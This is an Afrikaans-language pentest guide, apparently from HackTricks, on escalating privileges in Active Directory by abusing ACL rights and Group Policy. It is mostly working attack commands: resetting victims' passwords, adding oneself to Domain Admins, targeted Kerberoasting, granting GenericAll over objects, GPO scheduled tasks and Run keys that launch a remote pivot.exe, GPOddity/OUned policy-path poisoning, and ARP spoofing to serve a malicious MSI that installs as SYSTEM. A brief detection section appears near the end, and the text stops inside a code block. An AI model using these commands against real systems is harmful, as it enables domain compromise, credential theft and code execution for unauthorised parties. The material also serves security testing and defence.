# Misbruik van Active Directory-ACL's/ACE's

{{#include ../../../banners/hacktricks-training.md}}

**Hierdie bladsy is hoofsaaklik 'n opsomming van die tegnieke uit** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **en** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Raadpleeg die oorspronklike artikels vir meer besonderhede.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll-regte op gebruiker**

Hierdie voorreg gee 'n aanvaller volle beheer oor 'n teikengebruikersrekening. Sodra `GenericAll`-regte met die `Get-ObjectAcl`-opdrag bevestig is, kan 'n aanvaller:

- **Verander die teikengebruiker se wagwoord**: Met `net user <username> <password> /domain` kan die aanvaller die gebruiker se wagwoord terugstel.
- Vanaf Linux kan jy dieselfde oor SAMR met Samba `net rpc` doen:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **As die rekening gedeaktiveer is, verwyder die UAC-vlag**: `GenericAll` laat toe dat `userAccountControl` gewysig word. Vanaf Linux kan BloodyAD die `ACCOUNTDISABLE`-vlag verwyder:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Ken ’n SPN aan die gebruiker se rekening toe om dit kerberoastable te maak, en gebruik dan Rubeus en targetedKerberoast.py om die ticket-granting ticket (TGT)-hashes te onttrek en te probeer kraak.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Deaktiveer voorafverifikasie vir die gebruiker, wat hul rekening kwesbaar maak vir ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Met `GenericAll` op ’n gebruiker kan jy ’n sertifikaatgebaseerde geloofsbrief byvoeg en as daardie gebruiker staaf sonder om hul wagwoord te verander. Sien:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll-regte op groep**

Hierdie voorreg stel ’n aanvaller in staat om groeplidmaatskappe te manipuleer as hulle `GenericAll`-regte op ’n groep soos `Domain Admins` het. Nadat die aanvaller die groep se distinguished name met `Get-NetGroup` geïdentifiseer het, kan hulle:

- **Voeg hulself by die Domain Admins-groep**: Dit kan met direkte opdragte gedoen word of deur modules soos Active Directory of PowerSploit te gebruik.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Vanaf Linux kan jy ook BloodyAD gebruik om jouself by enige groepe te voeg wanneer jy GenericAll/Write-lidmaatskapbeheer daaroor het. As die teikengroep genestel is onder “Remote Management Users”, kry jy onmiddellik WinRM-toegang op gashere wat daardie groep erken:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write on Computer/User**

As hierdie regte op ’n rekenaarobjek of gebruikersrekening besit word, kan dit die volgende moontlik maak:

- **Kerberos Resource-based Constrained Delegation**: Maak dit moontlik om ’n rekenaarobjek oor te neem.
- **Shadow Credentials**: Gebruik hierdie tegniek om ’n rekenaar- of gebruikersrekening na te boots deur die regte om shadow credentials te skep, uit te buit.

## **WriteProperty on Group**

As ’n gebruiker `WriteProperty`-regte op alle objekte vir ’n spesifieke groep het (bv. `Domain Admins`), kan hulle:

- **Voeg hulself by die Domain Admins-groep**: Dit kan bereik word deur `net user`- en `Add-NetGroupUser`-opdragte te kombineer. Hierdie metode maak voorregte-eskalasie binne die domein moontlik.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (Self-lidmaatskap) op Groep**

Hierdie voorreg stel aanvallers in staat om hulself by spesifieke groepe, soos `Domain Admins`, te voeg deur opdragte te gebruik wat groeplidmaatskap direk manipuleer. Die volgende opdragreeks laat jou toe om jouself by te voeg:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

’n Soortgelyke voorreg stel aanvallers in staat om hulself direk by groepe te voeg deur groepseienskappe te wysig, indien hulle die `WriteProperty`-reg op daardie groepe het. Hierdie voorreg kan soos volg bevestig en uitgevoer word:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

As jy die `ExtendedRight` op ’n gebruiker vir `User-Force-Change-Password` het, kan jy wagwoorde terugstel sonder om die huidige wagwoord te ken. Jy kan hierdie reg verifieer en uitbuit met PowerShell of alternatiewe opdragreëlnutsgoed. Daar is verskeie maniere om ’n gebruiker se wagwoord terug te stel, insluitend interaktiewe sessies en eenreël-opdragte vir nie-interaktiewe omgewings. Die opdragte wissel van eenvoudige PowerShell-aanroepe tot die gebruik van `rpcclient` op Linux, wat die veelsydigheid van aanvalvektore demonstreer.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner op Group**

As ’n aanvaller ontdek dat hulle `WriteOwner`-regte oor ’n groep het, kan hulle die eienaarskap van die groep na hulself verander. Dit is veral invloedryk wanneer die betrokke groep `Domain Admins` is, aangesien verandering van eienaarskap groter beheer oor groepkenmerke en lidmaatskap moontlik maak. Die proses behels dat die korrekte objek met `Get-ObjectAcl` geïdentifiseer word en dan `Set-DomainObjectOwner` gebruik word om die eienaar te verander, hetsy volgens SID of naam.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite op gebruiker**

Hierdie toestemming stel ’n aanvaller in staat om gebruikereienskappe te wysig. Met `GenericWrite`-toegang kan die aanvaller spesifiek ’n gebruiker se aanmeldingskrippad verander sodat ’n kwaadwillige skrip uitgevoer word wanneer die gebruiker aanmeld. Dit word gedoen deur die `Set-ADObject`-opdrag te gebruik om die teikengebruiker se `scriptpath`-eienskap by te werk sodat dit na die aanvaller se skrip wys.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

’n Meer beperkte `WriteProperty` ACE wat tot die gebruiker se [`scriptPath`-kenmerk](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) beperk is, kan voldoende wees; `GenericWrite` is nie nodig nie. Kombineer daardie kenmerkreg met ’n skryfbare script in die domein se `SYSVOL\<domain>\scripts`- of `NETLOGON`-boom, en bepaal dan of die teikengebruiker waarskynlik sal aanmeld en die script sal bereik. Die script loop tydens aanmelding in daardie gebruiker se konteks. Hersien die effektiewe AD- en lêer-/deel-ACL’s afsonderlik; ’n ooreenstemmende Allow ACE of ’n skryfbare gids alleen bewys nie dat die volledige pad bestaan nie.

## **GenericWrite on Group**

Met hierdie reg kan aanvallers groeplidmaatskap manipuleer, byvoorbeeld deur hulself of ander gebruikers by spesifieke groepe te voeg. Hierdie proses behels die skep van ’n geloofsbriefe-objek, die gebruik daarvan om gebruikers by ’n groep te voeg of daaruit te verwyder, en die verifiëring van die lidmaatskapveranderinge met PowerShell-opdragte.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Vanuit Linux kan Samba `net` lede byvoeg/verwyder wanneer jy `GenericWrite` op die groep het (nuttig wanneer PowerShell/RSAT nie beskikbaar is nie):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Eienaarskap van ’n AD-objek en `WriteDACL`-regte daarop stel ’n aanvaller in staat om hulself `GenericAll`-regte oor die objek toe te ken. Dit word deur ADSI-manipulasie bewerkstellig, wat volle beheer oor die objek en die vermoë om sy groeplidmaatskappe te wysig, moontlik maak. Tog bestaan daar beperkings wanneer hierdie regte met die Active Directory-module se `Set-Acl` / `Get-Acl`-cmdlets uitgebuit word.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Vinnige oorname met WriteDACL/WriteOwner (PowerView)

Wanneer jy `WriteOwner` en `WriteDacl` oor ’n gebruiker- of diensrekening het, kan jy volle beheer verkry en sy wagwoord met PowerView terugstel sonder om die ou wagwoord te ken:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Notas:
- Jy moet dalk eers die eienaar na jouself verander as jy net `WriteOwner` het:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Valideer toegang met enige protokol (SMB/LDAP/RDP/WinRM) nadat die wagwoord teruggestel is.

## **Replikasie op die domein (DCSync)**

Die DCSync-aanval benut spesifieke replikasietoestemmings op die domein om ’n Domain Controller na te boots en data, insluitend gebruikersbewyse, te sinchroniseer. Hierdie kragtige tegniek vereis toestemmings soos `DS-Replication-Get-Changes`, wat aanvallers in staat stel om sensitiewe inligting uit die AD-omgewing te onttrek sonder direkte toegang tot ’n Domain Controller.<sup>[[5]](#references)</sup> [**Kom hier meer te wete oor die DCSync-aanval.**](../dcsync.md)

## GPO-delegasie <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO-delegasie

Gedelegeerde toegang om Group Policy Objects (GPOs) te bestuur, kan beduidende sekuriteitsrisiko’s inhou. As ’n gebruiker soos `offense\spotless` byvoorbeeld GPO-bestuursregte gedelegeer is, kan hulle voorregte soos **WriteProperty**, **WriteDacl** en **WriteOwner** hê. Hierdie toestemmings kan vir kwaadwillige doeleindes misbruik word, soos met PowerView geïdentifiseer: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### GPO-toestemmings lys

PowerSploit se cmdlets kan aan mekaar gekoppel word om verkeerd opgestelde GPOs te identifiseer. Só kan GPOs gevind word wat ’n spesifieke gebruiker mag bestuur: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Rekenaars waarop ’n gegewe beleid toegepas word**: Dit is moontlik om vas te stel op watter rekenaars ’n spesifieke GPO van toepassing is, wat help om die omvang van die moontlike impak te verstaan. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Beleide wat op ’n gegewe rekenaar toegepas word**: Opdragte soos `Get-DomainGPO` kan gebruik word om te sien watter beleide op ’n spesifieke rekenaar toegepas word.

**OU’s waarop ’n gegewe beleid toegepas word**: `Get-DomainOU` kan gebruik word om die organisatoriese eenhede (OU’s) te identifiseer waarop ’n gegewe beleid van toepassing is.

Jy kan ook die hulpmiddel [**GPOHound**](https://github.com/cogiceo/GPOHound) gebruik om GPOs te lys en probleme daarmee te vind.

### Misbruik GPO - New-GPOImmediateTask

Verkeerd opgestelde GPOs kan uitgebuit word om kode uit te voer, byvoorbeeld deur ’n onmiddellike geskeduleerde taak te skep. Dit kan gebruik word om ’n gebruiker by die plaaslike administrateursgroep op geaffekteerde masjiene te voeg, wat voorregte aansienlik verhoog:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy-module - Misbruik van GPO

Die GroupPolicy-module laat, indien dit geïnstalleer is, toe dat nuwe GPO's geskep en gekoppel word, en dat voorkeure soos registerwaardes gestel word om backdoors op geaffekteerde rekenaars uit te voer. Hierdie metode vereis dat die GPO opgedateer word en dat 'n gebruiker by die rekenaar aanmeld sodat dit uitgevoer kan word:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Misbruik GPO

SharpGPOAbuse bied ’n metode om bestaande GPO’s te misbruik deur take by te voeg of instellings te wysig sonder om nuwe GPO’s te hoef te skep. Hierdie nutsmiddel vereis dat bestaande GPO’s gewysig word, of dat RSAT-nutsmiddels gebruik word om nuwes te skep voordat veranderinge toegepas word:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Dwing beleidsopdatering

GPO-opdaterings vind gewoonlik ongeveer elke 90 minute plaas. Om hierdie proses te bespoedig, veral nadat ’n verandering geïmplementeer is, kan die opdrag `gpupdate /force` op die teikenrekenaar gebruik word om ’n onmiddellike beleidsopdatering af te dwing. Hierdie opdrag verseker dat enige wysigings aan GPO’s toegepas word sonder om vir die volgende outomatiese opdateringsiklus te wag.

### Agter die skerms

Wanneer die Geskeduleerde Take vir ’n gegewe GPO, soos die `Misconfigured Policy`, nagegaan word, kan die byvoeging van take soos `evilTask` bevestig word. Hierdie take word deur middel van skripte of opdragreëlnutsgoed geskep om stelselgedrag te verander of voorregte te eskaleer.

Die struktuur van die taak, soos aangedui in die XML-konfigurasielêer wat deur `New-GPOImmediateTask` gegenereer is, beskryf die besonderhede van die geskeduleerde taak — insluitend die opdrag wat uitgevoer moet word en die snellers daarvan. Hierdie lêer wys hoe geskeduleerde take binne GPO’s gedefinieer en bestuur word, en bied ’n metode om arbitrêre opdragte of skripte as deel van beleidsafdwinging uit te voer.

### Gebruikers en groepe

GPO’s maak dit ook moontlik om gebruikers- en groeplidmaatskappe op teikenstelsels te manipuleer. Deur die Users and Groups-beleidlêers direk te wysig, kan aanvallers gebruikers by bevoorregte groepe voeg, soos die plaaslike `administrators`-groep. Dit is moontlik deur GPO-bestuurstoestemmings te delegeer, wat die wysiging van beleidslêers toelaat om nuwe gebruikers in te sluit of groeplidmaatskappe te verander.

Die XML-konfigurasielêer vir Users and Groups beskryf hoe hierdie veranderinge geïmplementeer word. Deur inskrywings by hierdie lêer te voeg, kan spesifieke gebruikers verhoogde voorregte op die betrokke stelsels kry. Hierdie metode bied ’n direkte manier om voorregte deur GPO-manipulasie te eskaleer.

Vir sekuriteitsinstellings soos plaaslike groeplidmaatskap en gebruikersregte, ondersoek ook die toegepaste GPO-sjabloon by `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` en die ACL van die `SecEdit`-gids. ’n Skryfbare gids of lêer is ’n leidraad wat ondersoek moet word: effektiewe toegang tot die SYSVOL-deel, weierings- en geërfde ACL’s, die Group Policy-houertoestemmings, beleidsomvang en kliëntverversing bepaal steeds of ’n verandering in werking kan tree. Lidmaatskap van ’n groep met die naam “GPO Managers” bewys op sigself nie dat daar wysigingsregte is nie. [Microsoft dokumenteer hierdie sjabloonpad en die skeiding tussen die Group Policy-houer en -sjabloon.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Verder kan bykomende metodes om kode uit te voer of volharding te behou, soos die benutting van aanmeld-/afmeldskripte, die wysiging van registersleutels vir outomatiese uitvoer, die installering van sagteware via .msi-lêers of die wysiging van dienskonfigurasies, ook oorweeg word. Hierdie tegnieke bied verskeie maniere om toegang te behou en teikenstelsels te beheer deur GPO’s te misbruik.

### Herlei GPC/GPT-herwinning na geverifieerde skelm dienste

’n GPO bestaan uit ’n LDAP-**Group Policy Container (GPC)** met metadata en ’n SMB-gehoste **Group Policy Template (GPT)** met die beleidslêers. Tydens ’n verversing volg die kliënt die houer se `gPLink`, lees die verwysde GPC en sy `gPCFileSysPath`, en laai dan die GPT van daardie UNC-pad af. Gevolglik kan skryftoegang tot óf die GPC self óf die `gPLink` van ’n OU, Site of Domain omgeskakel word in bevoorregte beleidsverwerking.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Vergiftiging van `gPCFileSysPath` met GPOddity

As die beheerde principal die teiken-GPC kan skryf (direk of deur **NTLM relay na LDAP**), vervang `gPCFileSysPath` met ’n UNC-pad wat deur die aanvaller gehost word. [GPOddity](https://github.com/synacktiv/GPOddity) outomatiseer die LDAP-verandering en bedien ’n kwaadwillige GPT met modulegebaseerde beleidslêers of ’n Immediate Task wat die Group Policy-kliënt as `NT AUTHORITY\SYSTEM` uitvoer.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

’n Anonieme SMB-deel of een wat nie geloofsbriewe nagaan nie, is nie voldoende op huidige Windows-kliënte nie: SMB Secure Negotiate vereis bewys dat verifikasie geslaag het, dus moet die skelm diens die domeinidentiteit valideer, die SMB-sessiesleutel aflei en sy antwoorde korrek onderteken. In ingebedde modus, stel GPOddity op met ’n beheerde masjienrekening en sy dienssleutel, en kies dan ’n rekenaar- of gebruikerskant-loonvrag in die `[COMMANDS]`-afdeling.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**User GPO-edgegeval:** ná MS16-072 skep Windows steeds twee SMB2-sessies in dieselfde TCP-verbinding: die gebruikersessie lees `GPT.INI`, waarna die rekenaarrekeningsessie effektiewe konfigurasie soos `ScheduledTasks.xml` lees. ’n Kwaadwillige bediener moet daarom die verifikasietoestand, sessiesleutels en ondertekeningsleutels volgens SMB2-`SessionId` indekseer, nie net volgens sok nie. Die Scapy-fork wat in GPOddity/OUned ingebed is, implementeer dit deur `SMBStreamSocketMultiplexing` en ’n multiplexing-bewuste `SMBServer`; enkelbediener-sessies van Impacket/Scapy hergebruik andersins die verkeerde ondertekeningstoestand en faal met gebruikersbeleide.<sup>[[15]](#references)</sup>

#### `gPLink` poisoning met OUned

Met `WriteGPLink`, `GenericWrite` of gelykwaardige beheer oor ’n OU, Site of Domain kan ’n aanvaller ’n skakel byvoeg waarvan die GPC DN deur ’n LDAP-gasheer onder die aanvaller se beheer bedien word. Hierdie primitive is oorspronklik deur Petros Koutroumpis aangebied; [OUned](https://github.com/synacktiv/OUned) outomatiseer die LDAP-skryfaksie en die kwaadwillige GPC/GPT-ketting.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

Die slagoffer verifieer eers by die kwaadwillige LDAP-diens en ontvang ’n GPC waarvan `gPCFileSysPath` na die kwaadwillige SMB-diens wys; daarna verifieer dit by SMB en pas die verskafde GPT toe. OUned benodig dus ’n rekening met ’n LDAP-SPN, ’n masjienrekening met ’n HOST-SPN vir SMB (dieselfde masjienrekening kan albei vereistes dek), en DNS-resolusie of omgekeerde aanstuur wat poorte 389 en 445 na die operateur se gasheer stuur.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUned se ingebedde Scapy LDAP-bediener valideer Kerberos/SPNEGO met die werklike beheerde dienssleutel en bedien arbitrêre GPC-data vanaf JSON. Die leë JSON-sleutel modelleer rootDSE, `base64:`-voorvoegsels verteenwoordig binêre waardes, en die bediener ondersteun add/delete/modify/search plus `BASE`-, `LEVEL`- en `SUBTREE`-soektogte; dit kan sonder beskerming, met integriteit of met vertroulikheid onderhandel. Dit maak die diens herbruikbaar wanneer ’n ander Windows-komponent ’n aanvallerbeheerde LDAP-verwysing volg, maar op geverifieerde LDAP aandring.<sup>[[15]](#references)</sup>

Moenie aanvaar dat die sinchronisering van ’n rekeningwagwoord na ’n dummy-domein elke Kerberos-sleutel reproduseer nie: RC4 word van die wagwoord afgelei, terwyl AES-string-to-key ook ’n sout gebruik wat van die principal se gasheernaam/domein afgelei word. Deur die werklike AES-rekeningsleutel aan `KerberosSSP` te verskaf, vermy jy dat jy RC4 moet afdwing deur ’n waarneembare verandering aan die masjienrekening se selfskryfbare `msDS-SupportedEncryptionTypes`.<sup>[[15]](#references)</sup>

#### Opsporingspunte

Korrelleer veranderinge aan `gPCFileSysPath` of `gPLink` met GPO-weergaweveranderinge en nuwe Immediate/Scheduled Task-XML. Ondersoek skakels na onverwagte naamruimtekontekste, UNC-gashere buite die goedgekeurde DC/SYSVOL-stel, DNS-rekords wat masjienrekeningname herlei, LDAP/CIFS-dienst kaartjies vir ongewone masjienrekeninge, en veranderinge aan `msDS-SupportedEncryptionTypes` wat RC4 aktiveer.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC-padkaping (ARP-spoofing)

Met `WriteGPLink` oor ’n OU/domein kan jy die teikenhouer se `gPLink`-kenmerk wysig en **’n bestaande GPO dwing om toegepas te word** sonder om die GPO self te wysig. Dit raak interessant wanneer die gekoppelde GPO reeds na afgeleë inhoud oor **UNC-paaie** (`\\HOST\share\...`) verwys, omdat geverifieerde gebruikers **SYSVOL** kan lees en vanlyn na herbruikbare beleide kan soek.<sup>[[11]](#references)</sup>

Hoëvlak-werkvloei:

1. Gebruik BloodHound om ’n principal met `WriteGPLink` oor ’n OU te identifiseer en rekenaars/gebruikers binne daardie OU op te som.
2. Kloon `SYSVOL` in leesalleen-modus en ontleed GPO’s om **Software Installation**, **skyfkoppelinge** (`Drives.xml`) en **aanmeld-/opstartskripte** te soek wat na UNC-paaie verwys.
3. Verkies beleide wat na ’n **direkte gasheernaam** wys (byvoorbeeld `\\DC02\share\pkg.msi`) eerder as DFS/domeinnaamruimtepaaie, omdat gasheernaamgebaseerde paaie makliker met L2-spoofing herlei kan word.
4. Voeg die gekose GPO GUID by die teiken-OU se `gPLink` sodat die slagoffer daardie bestaande beleid verwerk.
5. ARP-spoof op dieselfde uitsaai-domein die UNC-gasheer en bind sy IP plaaslik (`ip addr add <target_ip>/32 dev <iface>`) sodat die slagoffer se SMB-verkeer jou gasheer bereik.
6. Bedien die verwagte pad/lêernaam vanaf ’n aanvaller-SMB-bediener (byvoorbeeld `smbserver.py`) en wag vir normale beleidsverwerking.

Voorbeeld van `SYSVOL`-versameling en GPO-korrelasie:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Koppel die bestaande GPO aan die teiken-OU:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

As die gekoppelde GPO ’n MSI vanaf ’n UNC-pad ontplooi, sal die kliënt dit tydens **rekenaaropstart** ophaal en as **`NT AUTHORITY\SYSTEM`** installeer. Deur die verwysde gasheer na te boots en ’n kwaadwillige MSI onder **dieselfde share/pad/naam** aan te bied, kan jy `WriteGPLink` in SYSTEM-kode-uitvoering omskep **sonder om SYSVOL te wysig**.

Belangrike beperkings:

- **Tydsberekening is belangrik**: die nuwe skakel word tydens beleidsverversing waargeneem (gewoonlik ná ~90 minute), maar **Software Installation** word gewoonlik met ’n **herlaai** geaktiveer.
- Windows Installer hou gewoonlik die ontplooiing dop deur die pakket se **`ProductCode`**. As die produk reeds geïnstalleer is, kan die ontplooiing oorgeslaan word.
- Om te voorkom dat die installeerder dit verwerp, pas die kwaadwillige MSI aan sodat sy **`ProductCode`** en **`PackageCode`** ooreenstem met dié van die wettige pakket wat die GPO verwag.
- Ou `.aas`-advertensielêers kan in `SYSVOL` agterbly, dus bevestig dat die ontplooiing steeds aktief lyk voordat jy daarop staatmaak.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP-aandryfkarterings in `Drives.xml` veroorsaak dat gebruikers tydens aanmelding of herverbinding by die opgestelde UNC-pad aanmeld. As jy die verwysde gasheer namaak, kan jy **NetNTLMv2** vasvang. As SMB doelbewus laat misluk, kan Windows dit weer oor **WebDAV** probeer en **NTLM oor HTTP** stuur. Dit maak relays na **LDAP(S)**, **AD CS** of **SMB** baie buigsaam.

#### Logon/startup script UNC hijack

Dieselfde patroon geld vir UNC-gehoste skripte wat in `SYSVOL` gevind word:

- **Logon scripts** word gewoonlik in die **user**-konteks uitgevoer.
- **Startup scripts** word gewoonlik in die **computer / SYSTEM**-konteks uitgevoer.

As die skrippad na ’n gasheernaam wys wat jy kan namaak, herlei die UNC-gasheer en bedien vervangende skripinhoud vanaf die verwagte ligging.

## SYSVOL/NETLOGON Logon Script Poisoning

Skryftoeganklike paaie onder `\\<dc>\SYSVOL\<domain>\scripts\` of `\\<dc>\NETLOGON\` laat jou toe om met logon-skripte te peuter wat tydens gebruiker-aanmelding deur GPO uitgevoer word. Dit lewer kode-uitvoering in die sekuriteitskonteks van gebruikers wat aanmeld.

### Vind logon-skripte
- Gaan gebruikerkenmerke na vir ’n opgestelde logon-skrip:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Crawl domain shares om kortpaaie of verwysings na scripts te vind:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- Ontleed `.lnk`-lêers om teikens op te spoor wat na SYSVOL/NETLOGON wys (nuttige DFIR-truuk en vir aanvallers sonder direkte GPO-toegang):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound vertoon die gebruikerobjek se `scriptPath`-aanmeldingskripkenmerk indien dit teenwoordig is. GPO-gekonfigureerde aanmeldingskripte is ’n aparte beleidsverwysing, dus moet jy ook die toepaslike GPO ondersoek.

### Valideer skryftoegang (moenie deellysinskrywings vertrou nie)
Outomatiese nutsgoed kan SYSVOL/NETLOGON as leesalleen aandui, selfs wanneer die presiese skrip ’n ander NTFS-ACL het. Begin met leesalleen-inspeksie van daardie lêer en sy ouergids; ooreenstemmende Allow-ACE’s bly kandidate, want effektiewe SMB- en NTFS-toegang, Deny-ACE’s en die huidige token speel almal ’n rol:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
